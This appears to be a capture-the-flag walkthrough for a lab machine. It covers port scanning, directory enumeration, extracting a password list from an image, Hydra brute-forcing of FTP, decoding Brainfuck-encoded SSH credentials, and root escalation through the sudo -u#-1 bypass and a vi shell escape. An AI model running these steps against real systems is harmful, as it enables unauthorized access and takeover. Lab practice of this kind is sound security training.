# Target = 10.10.21.42

## Port scanning
	nmap 10.10.21.42
	21/tcp open  ftp
	22/tcp open  ssh
	80/tcp open  http
(every service is a software (with versions))

	nmap -p 21,22,80 -sV 10.10.21.42
	21/tcp open  ftp     vsftpd 3.0.2
	22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
	80/tcp open  http    Apache httpd 2.4.10 ((Debian))
	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
	
## Directories
	dirb http://10.10.21.42/ (checking directories, gobuster is another tool for this)
	
	http://10.10.21.42/sup3r_s3cr3t_fl4g.php
	http://10.10.21.42/intermediary.php?hidden_directory=/WExYY2Cv-qU
	
## Metadata
	wget http://10.10.21.42/WExYY2Cv-qU/Hot_Babe.png (download file)
	strings Hot_Babe.png (checking metadata, exiftools is another tool for this)
	
	Username for FTP is: ftpuser
	One of these is the password:
	Mou+56n%QK8sr
	1618B0AUshw1M
	A56IpIl%1s02u
	vTFbDzX9&Nmu?
	FfF~sfu^UQZmT
	8FF?iKO27b~V0
	ua4W~2-@y7dE$
	3j39aMQQ7xFXT
	Wb4--CTc4ww*-
	u6oY9?nHv84D&
	0iBp4W69Gr_Yf
	TS*%miyPsGV54
	C77O3FIy0c0sd
	O14xEhgg0Hxz1
	5dpv#Pr$wqH7F
	1G8Ucoce1+gS5
	0plnI%f0~Jw71
	0kLoLzfhqq8u&
	kS9pn5yiFGj6d
	zeff4#!b5Ib_n
	rNT4E4SHDGBkl
	KKH5zy23+S0@B
	3r6PHtM4NzJjE
	gm0!!EC1A0I2?
	HPHr!j00RaDEi
	7N+J9BYSp4uaY
	PYKt-ebvtmWoC
	3TN%cD_E6zm*s
	eo?@c!ly3&=0Z
	nR8&FXz$ZPelN
	eE4Mu53UkKHx#
	86?004F9!o49d
	SNGY0JjA5@0EE
	trm64++JZ7R6E
	3zJuGL~8KmiK^
	CR-ItthsH%9du
	yP9kft386bB8G
	A-*eE3L@!4W5o
	GoM^$82l&GA5D
	1t$4$g$I+V_BH
	0XxpTd90Vt8OL
	j0CN?Z#8Bp69_
	G#h~9@5E5QA5l
	DRWNM7auXF7@j
	Fw!if_=kk7Oqz
	92d5r$uyw!vaE
	c-AA7a2u!W2*?
	zy8z3kBi#2e36
	J5%2Hn+7I6QLt
	gL$2fmgnq8vI*
	Etb?i?Kj4R=QM
	7CabD7kwY7=ri
	4uaIRX~-cY6K4
	kY1oxscv4EB2d
	k32?3^x1ex7#o
	ep4IPQ_=ku@V8
	tQxFJ909rd1y2
	5L6kpPR5E2Msn
	65NX66Wv~oFP2
	LRAQ@zcBphn!1
	V4bt3*58Z32Xe
	ki^t!+uqB?DyI
	5iez1wGXKfPKQ
	nJ90XzX&AnF5v
	7EiMd5!r%=18c
	wYyx6Eq-T^9#@
	yT2o$2exo~UdW
	ZuI-8!JyI6iRS
	PTKM6RsLWZ1&^
	3O$oC~%XUlRO@
	KW3fjzWpUGHSW
	nTzl5f=9eS&*W
	WS9x0ZF=x1%8z
	Sr4*E4NT5fOhS
	hLR3xQV*gHYuC
	4P3QgF5kflszS
	NIZ2D%d58*v@R
	0rJ7p%6Axm05K
	94rU30Zx45z5c
	Vi^Qf+u%0*q_S
	1Fvdp&bNl3#&l
	zLH%Ot0Bw&c%9
	
## Brute force - Hydra
	
	nano passwords.txt (putting the password list)
	
	hydra -l ftpuser -P passwords.txt ftp://10.10.21.42/ -vV (-l: login | -P: file | -vV: verbose, it shows the attempts)
	
	[21][ftp] host: 10.10.21.42   login: ftpuser   password: 5iez1wGXKfPKQ
	
## FTP
	ftp 10.10.21.42
	username
	password
	
	ftp> 
	get Eli's_Creds.txt (download file)
	
## Brainfuck
	cat:
	+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
	--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
	++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
	+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
	]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
	++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
	--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
	+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
	++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
	<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
	<]>+. <+++[ ->--- <]>-- ---.- ----. <
	
	Brainfuck decoded (https://www.dcode.fr/brainfuck-language):
	User: eli
	Password: DSpDiM1wAEwid
	
## SSH & Privilege escalation
	ssh eli@10.10.21.42
	password
	
	find / -name s3cr3t 2> /dev/null (finding name into the system, 2> /dev/null: exception sending errors to>, / = root folder)
	ls -a (finding hidden archives)
	
	su gwendoline (changing user)
	MniVCQVhQHUNI
	
	sudo -l (checking if user has any permission to execute any file into the system)
	
	https://gtfobins.github.io/ - Privilege escalation
	
	(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
	sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt - Editing file with root as the user has root permission for this one
	
	:!ls (VI will execute this)
	
	:!/bin/bash (VI will escalate your permission to root permanently)
